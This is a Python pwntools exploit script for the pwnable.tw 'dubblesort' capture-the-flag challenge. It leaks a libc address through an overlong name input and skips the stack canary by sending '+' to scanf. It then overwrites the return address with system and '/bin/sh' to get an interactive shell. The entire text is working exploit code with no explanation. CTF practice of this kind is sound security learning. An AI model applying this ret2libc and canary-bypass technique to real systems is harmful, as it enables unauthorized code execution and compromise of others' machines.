from pwn import *

locdbg=		False

if locdbg:
	p=process('dubblesort')
else:
	p=remote('chall.pwnable.tw',10101)
context.log_level='debug'
system_ofs=0x3a940

libc=ELF('./libc_32.so.6')
fp=open('a.txt','w')

def pdbg():
	if locdbg:
		gdb.attach()
	else:
		print('Run on server.')

print(p.recv())
p.send('a'*25)
got_plt=u32(b'\x00'+p.recv()[31:34])
libc_base=got_plt-0x1b0000
system_addr=libc_base+libc.symbols['system']
sh_addr=libc_base+next(libc.search(b'/bin/sh'))
n=24+1+9+1
p.sendline(str(n))
for i in range(24):
	p.recv()
	p.sendline('1')
p.recv()
p.sendline('+')
for i in range(9):
	p.recv()
	p.sendline(str(system_addr))
p.recv()
p.sendline(str(sh_addr))
p.recv()
sleep(1)
p.interactive()
